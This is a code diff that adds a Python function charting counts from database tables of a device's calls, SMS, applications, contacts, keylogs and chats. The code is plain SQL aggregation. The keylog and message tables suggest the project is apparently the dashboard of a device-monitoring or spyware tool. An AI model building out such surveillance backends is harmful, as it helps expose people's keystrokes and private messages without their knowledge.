@@ -274,3 +274,70 @@ def test_db_connection():
     except Exception as e:
         print(f'Database connection error: {str(e)}')
         return False
+
+def get_data_for_visualization(category):
+    conn = get_db_connection()
+    cur = conn.cursor()
+
+    if category == 'calls':
+        query = """
+        SELECT call_type, COUNT(*) as count
+        FROM calls
+        GROUP BY call_type
+        """
+    elif category == 'sms':
+        query = """
+        SELECT message_type, COUNT(*) as count
+        FROM sms
+        GROUP BY message_type
+        """
+    elif category == 'applications':
+        query = """
+        SELECT application_name, COUNT(*) as count
+        FROM applications
+        GROUP BY application_name
+        ORDER BY count DESC
+        LIMIT 10
+        """
+    elif category == 'contacts':
+        query = """
+        SELECT 
+            CASE 
+                WHEN email != 'not_available@example.com' THEN 'With Email'
+                ELSE 'Without Email'
+            END as email_status,
+            COUNT(*) as count
+        FROM contacts
+        GROUP BY email_status
+        """
+    elif category == 'keylogs':
+        query = """
+        SELECT application_id, COUNT(*) as count
+        FROM keylogs
+        GROUP BY application_id
+        ORDER BY count DESC
+        LIMIT 10
+        """
+    elif category == 'chats':
+        query = """
+        SELECT sender, COUNT(*) as count
+        FROM chats
+        GROUP BY sender
+        ORDER BY count DESC
+        LIMIT 10
+        """
+    else:
+        return {"error": "Invalid category"}
+
+    cur.execute(query)
+    results = cur.fetchall()
+    
+    data = {
+        "labels": [row[0] for row in results],
+        "data": [row[1] for row in results]
+    }
+
+    cur.close()
+    conn.close()
+
+    return data
